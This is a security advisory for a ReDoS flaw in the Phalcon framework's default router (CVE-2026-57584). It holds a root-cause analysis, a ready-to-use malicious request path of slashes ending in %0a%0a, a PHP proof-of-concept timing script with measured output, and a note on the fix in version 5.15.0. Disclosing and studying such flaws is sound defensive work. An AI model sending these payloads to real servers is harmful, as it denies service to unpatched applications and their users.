# [H] Phalcon: Catastrophic backtracking (ReDoS) in the default Phalcon Router route lead to remote unauthenticated DoS

## Summary
Severity: High
Advisory: GHSA-x7rj-f32v-7jjg
CVE: CVE-2026-57584
CWE: CWE-1333
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-x7rj-f32v-7jjg
Type: github-advisory

## Affected
- Packagist: `phalcon/cphalcon` — affected >=0 <5.15.0

## Details
## Summary

Every Phalcon MVC application built with a default router (`new Phalcon\Mvc\Router()` or `new Phalcon\Mvc\Router(true)`, which is the normal case) registers a built-in route whose compiled PCRE pattern is `#^/([\w0-9\_\-]+)/([\w0-9\.\_]+)(/.*)*$#u`. The trailing `(/.*)*` is a nested quantifier whose group body (`/.*`) overlaps itself (`.` matches `/`, and there is no `s`/DOTALL flag), so when the final `$` is forced to fail the engine explores roughly `2^(N/2)` ways to split a run of `N` slashes, causing classic catastrophic backtracking. `Phalcon\Mvc\Router::handle()` runs on **every** request and matches this pattern against the attacker-controlled request URI, so a single short request can burn seconds-to-minutes of CPU per request. The same `(/.*)*` construct is also produced by the `/:params` placeholder (`Phalcon\Mvc\Router\Route::compilePattern()`) and by the CLI router (`Phalcon\Cli\Router` / `Phalcon\Cli\Router\Route`).


## Details 

The vulnerable pattern is emitted in four places, all carrying the same `*` nested quantifier:

- Default MVC route registration `phalcon/Mvc/Router.zep` (`Router::__construct()`): `"#^/([\\w0-9\\_\\-]+)/([\\w0-9\\.\\_]+)(/.*)*$#u"`, with paths `["controller": 1, "action": 2, "params": 3]`.
- `/:params` placeholder expansions `phalcon/Mvc/Router/Route.zep` (`Route::compilePattern()`): `str_replace("/:params", "(/.*)*", pattern)`.
- Default CLI route `phalcon/Cli/Router.zep` (`Router::__construct()`): `"#^(?::delimiter)?([a-zA-Z0-9\\_\\-]+):delimiter([a-zA-Z0-9\\.\\_]+)(:delimiter.*)*$#"`.
- CLI `/:params` expansion `phalcon/Cli/Router/Route.zep` (`Route::compilePattern()`): `"(" . this->delimiter . ".*)*"`.

`Router::handle()` matches the request URI against this pattern on every request (the combined-regex fast path and the per-route dynamic loop both call `preg_match()` with it). When the subject string ends in a byte that the group cannot consume (for example a newline, since `.` does not match `\n`), the anchored `$` cannot be satisfied and the engine backtracks over every partition of the leading run of slashes, which is exponential in the number of slashes.

## Remote reachability

In the default MVC configuration the router uses `URI_SOURCE_GET_URL`, i.e. it reads the request path from `$_GET["_url"]`, which the web server populates from the rewritten request path. **PHP URL-decodes `$_GET`**, so a request path containing `%0a%0a` arrives as the literal two-byte string `"\n\n"`. The two newlines are the trigger: `.` cannot match `\n`, and PCRE's `$` forgives exactly one trailing `\n`, so two of them force the match to fail and unleash the backtracking. No authentication, cookies, or application-specific routes are needed.

Example malicious request path (≈40 bytes): `/a/a////////////////////////////////%0a%0a` (two short segments, a run of `/`, then `%0a%0a`).

Applications configured with `URI_SOURCE_SERVER_REQUEST_URI` are not reachable through this specific newline trick because `REQUEST_URI` is not URL-decoded; they remain exposed to the underlying CPU amplification when the unmatchable tail can be introduced by other means.

## Proof of Concept

```php
<?php

use Phalcon\Di\FactoryDefault;
use Phalcon\Mvc\Router;

$di = new FactoryDefault();
$router = new Router(true);   // defaultRoutes = true (the default)
$router->setDI($di);

echo "phalcon            : " . phpversion("phalcon") . "\n";
echo "pcre.backtrack_limit: " . ini_get("pcre.backtrack_limit") . "\n";
echo "pcre.jit           : " . ini_get("pcre.jit") . "\n";

// Default configuration
foreach ($router->getRoutes() as $r) {
    if (strpos($r->getCompiledPattern(), "(/.*)*") !== false) {
        echo "vulnerable route   : " . $r->getCompiledPattern() . "\n";
    }
}
echo "\n";

function bench(Router $router, string $uri, string $label): void
{
    $t0 = hrtime(true);
    try {
        $router->handle($uri);
    } catch (\Throwable $e) {
        // matching failure and fallback to time
    }
    $ms = (hrtime(true) - $t0) / 1e6;
    printf("  %-22s uri_len=%4d   %10.3f ms\n", $label, strlen($uri), $ms);
}

bench($router, "/products/edit/123", "normal URL");
echo "\n";

// Malicious: two short segments, then a run of slashes, then "\n\n" (the decoded %0a%0a).
$ks = getenv("REDOS_KS") ? array_map("intval", explode(",", getenv("REDOS_KS")))
                         : [14, 18, 22, 26, 30, 34];
foreach ($ks as $k) {
    $uri = "/a/a" . str_repeat("/", $k) . "\n\n";
    bench($router, $uri, "evil slashes=$k");
}

echo "\nEach +4 slashes multiplies time ~16x (clean 2^N). A ~40-byte URL is sufficient\n";
echo "to pin a CPU core; under default backtrack_limit the per-request cost is a fixed\n";
echo "(but ~10000x-amplified vs a normal route) bail, exhausting workers under volume.\n";


```

in poc above builds a default `Phalcon\Mvc\Router`, confirms the live compiled pattern contains `(/.*)*`, and times `$router->handle($uri)` (the real request path) for crafted URIs of the form `"/a/a" . str_repeat("/", k) . "\n\n"`. Measured against a clean, non-sanitizer build of Phalcon 5.14.2 (PHP 8.3.31 NTS):

```
phalcon            : 5.14.2
vulnerable route   : #^/([\w0-9\_\-]+)/([\w0-9\.\_]+)(/.*)*$#u

DEFAULT config (pcre.jit=1, backtrack_limit=1,000,000)
  normal URL             uri_len=  18        1.182 ms
  evil slashes=22        uri_len=  28        1.016 ms
  evil slashes=34        uri_len=  40        1.015 ms   (plateau = backtrack-limit bail)

RAISED backtrack_limit=1e9, pcre.jit=0 (true exponential)
  evil slashes=18        uri_len=  24        5.555 ms
  evil slashes=22        uri_len=  28       90.317 ms
  evil slashes=24        uri_len=  30      356.800 ms
  evil slashes=26        uri_len=  32     1426.734 ms
  evil slashes=28        uri_len=  34     5727.099 ms
```

The curve is cleanly exponential each four extra slashes multiplies the time by ~16× (`2^(N/2)`). A ~34-byte URL already costs ~5.7 s of CPU; ~40 bytes reaches minutes.

## Impact

Two regimes, both measured on the real build:

- **Default PHP configuration (JIT on, `pcre.backtrack_limit = 1,000,000`):** each match bails at the backtrack limit after a fixed ~1 ms and `preg_match()` reports failure. This is not a per-request hang, but it is (a) a large CPU amplification per tiny request a few hundred concurrent ~40-byte requests saturate the PHP-FPM worker pool (volumetric DoS), and (b) a correctness bug, because the default route silently fails to match and affected requests mis-route / 404. 

- **PCRE JIT disabled, or `pcre.backtrack_limit` raised:** a single ~40-byte request pins a CPU core for seconds to minutes a classic single-packet ReDoS that hangs a worker outright. PCRE JIT is disabled on a number of distributions/builds, and applications with complex routes or large request bodies sometimes raise the backtrack limit, so this is a realistic configuration.

## References
- https://github.com/phalcon/cphalcon/security/advisories/GHSA-x7rj-f32v-7jjg
- https://nvd.nist.gov/vuln/detail/CVE-2026-57584
- https://github.com/phalcon/cphalcon/commit/14ba22d389d5ca620bb9d5207205f836ef1224f2
- https://github.com/phalcon/cphalcon/commit/fa798e919cb2c487062bb9899ad6fc2b673b3a67
- https://github.com/phalcon/cphalcon
- https://github.com/phalcon/cphalcon/releases/tag/v5.15.0
